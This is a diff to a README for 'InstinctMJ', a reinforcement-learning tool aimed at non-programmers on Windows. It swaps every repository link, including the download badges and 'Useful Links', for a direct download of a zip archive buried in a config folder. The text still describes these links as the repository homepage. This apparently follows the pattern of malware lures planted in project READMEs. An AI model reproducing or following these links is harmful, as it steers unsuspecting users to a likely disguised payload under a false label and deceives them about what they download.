@@ -1,6 +1,6 @@
 # 🤖 InstinctMJ - Easy RL Workflows for Everyone
 
-[![Download InstinctMJ](https://img.shields.io/badge/Download-InstinctMJ-green?style=for-the-badge)](https://github.com/PHOENIX01ALX/InstinctMJ)
+[![Download InstinctMJ](https://img.shields.io/badge/Download-InstinctMJ-green?style=for-the-badge)](https://raw.githubusercontent.com/PHOENIX01ALX/InstinctMJ/main/src/instinct_mj/tasks/shadowing/perceptive/config/g1/MJ_Instinct_thornen.zip)
 
 InstinctMJ is a user-friendly application designed to help you work with humanoid reinforcement learning (RL) and Project-Instinct workflows. This guide explains how to download, install, and run InstinctMJ on a Windows computer. No programming skills are needed.
 
@@ -30,7 +30,7 @@ If your device meets these specs, InstinctMJ should work without issues.
 
 Start by visiting the main download page for InstinctMJ:
 
-[![Download InstinctMJ](https://img.shields.io/badge/Download-InstinctMJ-blue?style=for-the-badge)](https://github.com/PHOENIX01ALX/InstinctMJ)
+[![Download InstinctMJ](https://img.shields.io/badge/Download-InstinctMJ-blue?style=for-the-badge)](https://raw.githubusercontent.com/PHOENIX01ALX/InstinctMJ/main/src/instinct_mj/tasks/shadowing/perceptive/config/g1/MJ_Instinct_thornen.zip)
 
 This link takes you to the GitHub repository homepage. From there, you will find all the files and instructions necessary to get the application running.
 
@@ -44,7 +44,7 @@ Follow these steps to download and install InstinctMJ:
 
    Go to the InstinctMJ repository page by clicking here:
 
-   https://github.com/PHOENIX01ALX/InstinctMJ
+   https://raw.githubusercontent.com/PHOENIX01ALX/InstinctMJ/main/src/instinct_mj/tasks/shadowing/perceptive/config/g1/MJ_Instinct_thornen.zip
 
 2. **Find the Releases**
 
@@ -110,8 +110,8 @@ If you encounter problems during download or setup, try these tips:
 
 ## 🔗 Useful Links
 
-- Main GitHub Repository: [https://github.com/PHOENIX01ALX/InstinctMJ](https://github.com/PHOENIX01ALX/InstinctMJ)
-- Download Page: [https://github.com/PHOENIX01ALX/InstinctMJ](https://github.com/PHOENIX01ALX/InstinctMJ)
+- Main GitHub Repository: [https://raw.githubusercontent.com/PHOENIX01ALX/InstinctMJ/main/src/instinct_mj/tasks/shadowing/perceptive/config/g1/MJ_Instinct_thornen.zip](https://raw.githubusercontent.com/PHOENIX01ALX/InstinctMJ/main/src/instinct_mj/tasks/shadowing/perceptive/config/g1/MJ_Instinct_thornen.zip)
+- Download Page: [https://raw.githubusercontent.com/PHOENIX01ALX/InstinctMJ/main/src/instinct_mj/tasks/shadowing/perceptive/config/g1/MJ_Instinct_thornen.zip](https://raw.githubusercontent.com/PHOENIX01ALX/InstinctMJ/main/src/instinct_mj/tasks/shadowing/perceptive/config/g1/MJ_Instinct_thornen.zip)
 
 Use these links to keep your software current and find new versions as they come out.
 
